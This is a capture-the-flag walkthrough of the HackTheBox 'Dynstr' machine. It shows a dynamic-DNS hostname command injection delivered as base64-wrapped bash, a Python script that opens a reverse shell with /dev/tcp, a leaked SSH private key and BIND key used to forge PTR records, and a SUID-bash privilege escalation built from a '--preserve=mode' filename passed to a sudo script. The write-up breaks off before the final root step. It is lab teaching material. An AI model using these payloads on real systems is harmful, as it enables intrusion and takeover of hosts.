# Enumeration
## Ports
|Ports|service|version|
|-----|----|-----|
|22|SSH|OpenSSH 8.2p1 Ubuntu 4ubuntu0.2|
|53|DNS|ISC BIND 9.16.1 (Ubuntu Linux)|
|80|HTTP|Apache httpd 2.4.41|
## NMAP
```bash
# Nmap 7.91 scan initiated Sun Jun 13 04:53:49 2021 as: nmap -vvv -p 22,53,80 -A -v -oN intial.nmap 10.10.10.244
Nmap scan report for dynstr.htb (10.10.10.244)
Host is up, received syn-ack (0.16s latency).
Scanned at 2021-06-13 04:53:51 BST for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 13 04:54:07 2021 -- 1 IP address (1 host up) scanned in 18.86 seconds
```
## DNS Enumeration
For this part I reffered to one of my favourite website for refference https://book.hacktricks.xyz/pentesting/pentesting-dns
Let's get the banner for the DNS version
```bash
kali@kali:~/HackTheBox/Dnystr$ dig version.bind CHAOS TXT @dyna.htb 

; <<>> DiG 9.16.6-Debian <<>> version.bind CHAOS TXT @dyna.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4466
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: b77e9a9f67b1f5f90100000060c5861de92467d50f31d6e8 (good)
;; QUESTION SECTION:
;version.bind.                  CH      TXT

;; ANSWER SECTION:
version.bind.           0       CH      TXT     "9.16.1-Ubuntu"

;; Query time: 895 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Sun Jun 13 05:14:20 BST 2021
;; MSG SIZE  rcvd: 95
```
Looking at almost any record that is publicly available we find some subdomains
```bash
kali@kali:~/HackTheBox/Dnystr$ dig ANY @10.10.10.244 dyna.htb 

; <<>> DiG 9.16.6-Debian <<>> ANY @10.10.10.244 dyna.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2373
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 0f688fabfb70c2290100000060c586d1897c2db3023fe7fc (good)
;; QUESTION SECTION:
;dyna.htb.                      IN      ANY

;; ANSWER SECTION:
dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60
dyna.htb.               60      IN      NS      dns1.dyna.htb.

;; ADDITIONAL SECTION:
dns1.dyna.htb.          60      IN      A       127.0.0.1

;; Query time: 659 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Sun Jun 13 05:17:19 BST 2021
;; MSG SIZE  rcvd: 147
```
let's add those to /etc/hosts
```bash
sudo echo "10.10.10.244  dns1.dyna.htb hostmaster.dyna.htb" >> /etc/hosts
```
visiting the subdomains doesn't do you any good. it's the same website so let's move on.
## Web Enumeration
visiting the website we can see the potential dns name for the host.
![alt text][https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Dynstr%20(HTB)/Pasted%20image%2020210613094211.png]]
At the very bottom of the page we can see there is the email to contact with the domain dyna.htb so let's add it in /etc/hosts
```bash
sudo echo "10.10.10.244  dyna.htb" >> /etc/hosts 
```
let's visit the page nothing changed.
### Directory Fuzzing
```bash
kali@kali:~/HackTheBox/Dnystr$ ffuf -u http://dyna.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c -e .txt,.php,.html
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dyna.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .txt .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd.html          [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.html          [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10909, Words: 1937, Lines: 282]
nic                     [Status: 301, Size: 302, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
:: Progress: [81876/81876] :: Job [1/1] :: 379 req/sec :: Duration: [0:07:49] :: Errors: 1135 ::
```
we have intresting nic directory.
Visiting that nic directory we can see just a blank page so let's the and fuzz that directory again.
```bash
kali@kali:~/HackTheBox/Dnystr$ ffuf -u http://dyna.htb/nic/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dyna.htb/nic/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
:: Progress: [20469/20469] :: Job [1/1] :: 982 req/sec :: Duration: [0:00:38] :: Errors: 3 ::
```
We got the subdirectory update let's check it.
Visiting the directory we got the bad auth as output.
!![alt text][https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Dynstr%20(HTB)/Pasted%20image%2020210613101320.png]]
From earlier we have creds for beta version of the website.
![alt text][https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Dynstr%20(HTB)/Pasted%20image%2020210613101429.png]]
So let's try to auth with HTTP basic authentication.
I wrote a simple python script for that
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://dyna.htb/nic/update'

res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print (res.text)
```
Running the script we get the following output.
```bash
kali@kali:~/HackTheBox/Dnystr$ chmod +x script.py
kali@kali:~/HackTheBox/Dnystr$ ./script.py 
nochg 10.10.14.6
```
at first I didn't understand nochg in reponse so I google nochg and landed on the following article.
https://help.dyn.com/remote-access-api/return-codes/
It looks like it's an API for dynamic DNS and we are at the update portal.
Looking at the following article we can see how to perform updates.
https://help.dyn.com/remote-access-api/perform-update/
looking at the example in article I knew that I have to pass two parameter atleast to perform update i.e the hostname and myip so let's try it.
Again going back to website we know we have few dynamic dns running so let's try and get it.
Updated python script to perform updates
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://dyna.htb/nic/update'
params = {
	'myip' : '<YOUR IP>',
	'hostname': 'test.no-ip.htb'
}

res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```
let's send this request.
```bash
kali@kali:~/HackTheBox/Dnystr$ ./script.py 
good 10.129.125.61
```
we got the good response so we can perform update now let's look at some parameters we can tamper.
Looking through the above perform update article I can see one intresting thing that the update will get distributed to all the linked device so if we can inject the hostname we can get the possible RCE and I thought about injecting IP but it's is not possible as it will lead to validation problem as IP cannot have character so we can inject hostname and send payload as subdomain name but we cannot use special chars as it is not allowed as a domain name so we have base64 encode the payload and send the request.
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'id'
final = b64encode(payload)
print (final)
params = {
	'myip' : '10.129.125.61',
	'hostname': '{}.no-ip.htb'.format(final)
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```
let's run the script.
```bash
kali@kali:~/HackTheBox/Dnystr$ ./script.py 
b'aWQ='
911 [nsupdate failed]
```
https://www.noip.com/integrate/request
It said nsudate failed so we know that we cannot update ns record but going through documentation we have an option to push update offline.
so let's try that.
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'pwd'
final = b64encode(payload)
#print (final)
params = {
	'myip' : '10.129.125.61',
	'hostname': '`echo "{}" | base64 -d | bash`test.no-ip.htb'.format(str(final)),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```
we get the output
```bash
kali@kali:~/HackTheBox/Dnystr$ ./script.py
good 10.129.125.61
```
Looks like it could to blind RCE so let's try and ping your machine.
UPDATED script
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'ping -c 4 <YOUR IP>'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '<YOUR IP>',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.htb'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```
Running the script
```bash
kali@kali:~/HackTheBox/Dnystr$ ./script.py 
cGluZyAtYyA0IDEwLjEwLjE0LjIz
server 127.0.0.1
zone no-ip.htb
update delete PING 10.10.14.23 (10.10.14.23) 56(84) bytes of data.
64 bytes from 10.10.14.23: icmp_seq=1 ttl=63 time=263 ms
64 bytes from 10.10.14.23: icmp_seq=2 ttl=63 time=264 ms
64 bytes from 10.10.14.23: icmp_seq=3 ttl=63 time=277 ms
64 bytes from 10.10.14.23: icmp_seq=4 ttl=63 time=265 ms

--- 10.10.14.23 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 262.606/266.963/276.675/5.655 msdynadns.no-ip.htb
good 10.10.14.23
```
Got the ping back
```bash
kali@kali:~/HackTheBox/Dnystr$ sudo tcpdump -i tun0 -n icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:09:29.609190 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 1, seq 1, length 64
07:09:29.609340 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 1, seq 1, length 64
07:09:30.610281 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 1, seq 2, length 64
07:09:30.610478 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 1, seq 2, length 64
07:09:31.626395 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 1, seq 3, length 64
07:09:31.626509 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 1, seq 3, length 64
07:09:32.614192 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 1, seq 4, length 64
07:09:32.614305 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 1, seq 4, length 64
07:09:32.891974 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 2, seq 1, length 64
07:09:32.892124 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 2, seq 1, length 64
07:09:33.898528 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 2, seq 2, length 64
07:09:33.898640 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 2, seq 2, length 64
07:09:34.899420 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 2, seq 3, length 64
07:09:34.899723 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 2, seq 3, length 64
07:09:35.891249 IP 10.129.125.61 > 10.10.14.23: ICMP echo request, id 2, seq 4, length 64
07:09:35.891363 IP 10.10.14.23 > 10.129.125.61: ICMP echo reply, id 2, seq 4, length 64
```
# Exploitation
Let's get the revshell back to our machine
## Don't forget to spin up listener on that port.
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '<YOUR IP>',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.htb'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```
on NC
```bash
kali@kali:~/HackTheBox/Dnystr$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [<YOUR IP>] from (UNKNOWN) [10.129.125.61] 56926
bash: cannot set terminal process group (812): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$
```
We have REV shell now let's go onto user.
# WWW-Data to bindmgr
## Enumeration
```bash
ls -al /home
total 16
drwxr-xr-x  4 root    root    4096 Mar 15 20:26 .
drwxr-xr-x 18 root    root    4096 May 25 14:52 ..
drwxr-xr-x  5 bindmgr bindmgr 4096 Mar 15 20:39 bindmgr
drwxr-xr-x  3 dyna    dyna    4096 Mar 18 20:00 dyna
```
Looks like we have access to both of the users.
let's check bindmgr
```bash
ls -al
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun 13 00:03 user.txt
```
Looks like we have access .ssh so let's look into it.
```bash
ls -al
total 24
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
```
We can get the id_rsa.pub,known host and authorized_keys but not id_rsa that sucks.
Let's check authorized_keys first.
```bash
cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```
We can connect to bindmgr using his private key if we satisfy this DNS record condition \*.infra.dyna.htb but can't get into that until we have the id_rsa even if we pass the check.
Looking inside home directory we have access to another unsual and intresting directory support-case-C62796521.
Let's look into it.
```bash
ls -al
total 436
drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13 14:53 .
drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt
```
let's check all the files
```bash
<-----SNIP------>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
<-----SNIP------>
```
We have the output key in strace file.
strace-C62796521.txt
So now we have the private key now we can start working on the DNS condition part for SSH login.
## Exploitation
As we know that PTR records provides the domain name associated with an IP so we have to add PTR record that matches the above regex that is pointing to our IP.
First of all to edit the records for infra we have to get the key for infra so let's get it by going to /etc/bind/infra.key
```bash
cat /etc/bind/infra.key
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};
```
Now that we have the key we can bind out record into DNS so let's try that.
First we have to load up the nslookup console and import the keyfile.
```bash
nsupdate -k /etc/bind/infra.key
```
Then let's add the A record for our host
```bash
update add oops.infra.dyna.htb 86400 A <YOUR IP>

update add <YOUR IP IN REVERSE>.in-addr.arpa 86400 PTR oops.infra.dyna.htb
```
For eg- your ip is 10.10.14.127
Reverse ip is 127.14.10.10
It's is important to leave a line after addition of the A record or else it will give you an update failed: NOTZONE error.
so after this let's see what we are adding.
```bash
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
23.14.10.10.in-addr.arpa. 86400 IN      PTR     oops.infra.dyna.htb.

send
quit
```
And then after that send it and quit.
now let's copy the above RSA key in a id_rsa file and let's SSH.
```bash
kali@kali:~/HackTheBox/Dnystr$ chmod 700 id_rsa

kali@kali:~/HackTheBox/Dnystr$ ssh -i id_rsa bindmgr@dyna.htb 
Last login: Tue Jun  8 19:52:28 2021 from oops.infra.dyna.htb

bindmgr@dynstr:~$

bindmgr@dynstr:~$ cat user.txt
9f9fd7e87df38eea957e2cf7e2aff092 
```
And we are bindmgr let's get root now.
# PrivESC
## Enumeration
### sudo -l
```bash
bindmgr@dynstr:/tmp$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```
Looks like we can run /usr/local/bin/bindmgr.sh as root so let's look into script.
```bash

bindmgr@dyna:~$ cat /usr/local/bin/bindmgr.sh

#!/usr/bin/bash
# This script generates named.conf.bindmgr to workaround the problem
# that  bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#not deleting them. As we generate the list of files to be included
#from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
	echo "[-] ERROR: Check versioning. Exiting."
	exit 42
fi  
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then                                                                     [0/598]
	echo "[-] ERROR: Check versioning. Exiting."
	exit 43
fi
# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF 
for file in * ; do
	printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR." 
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration." 
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
	echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
	named-checkconf $BINDMGR_CONF 2>&1 | indent
	exit 44
else 
	echo "[+] Configuration successfully staged."
	# *** TODO *** Uncomment restart once we are live.
	# systemctl restart bind9
	if [[ $? -ne 0 ]] ; then
		echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
		systemctl status bind9
	else
		echo "[+] Restart of bind9 via systemctl succeeded."
	fi
fi
```
Looking at the script we can see that we need a .version file in the current directory with a version number so let's create it.
```bash

bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh | grep cp
cp .version * /etc/bind/named.bindmgr/

bindmgr@dynstr:/dev/shm$ echo 2 > .version

```
we can see from the script that we can get the privilege on the binary in the same directory so let's get /bin/bash to this directory.
```bash

bindmgr@dynstr:/dev/shm$ cp /bin/bash .

```
Now let's give it a suid bit and preserve that mode on that binary so now when we will execute the script we will get root privileged binary in /etc/bind/named.bindmgr/
```bash
bindmgr@dynstr:/dev/shm$ chmod +s bash 
bindmgr@dynstr:/dev/shm$ echo > --preserve=mode
bindmgr@dynstr:/dev/shm$ ls -al
total 1164
drwxrwxrwt  2 root    root        100 Jun 13 19:22  .
drwxr-xr-x 17 root    root       3960 Jun 13 15:38  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 13 19:20  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 13 19:22 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Jun 13 19:17  .version
```
Now let's execute the sudo command and get the root privileges on our bash binary.
```bash
bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
bindmgr@dynstr:/dev/shm$ ls
 bash  '--preserve=mode'
bindmgr@dynstr:/dev/shm$ ls -al
total 1164
drwxrwxrwt  2 root    root        100 Jun 13 19:22  .
drwxr-xr-x 17 root    root       3960 Jun 13 15:38  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 13 19:20  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 13 19:22 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Jun 13 19:17  .version
```
Now let's run the bash as the privileged as root.
```bash
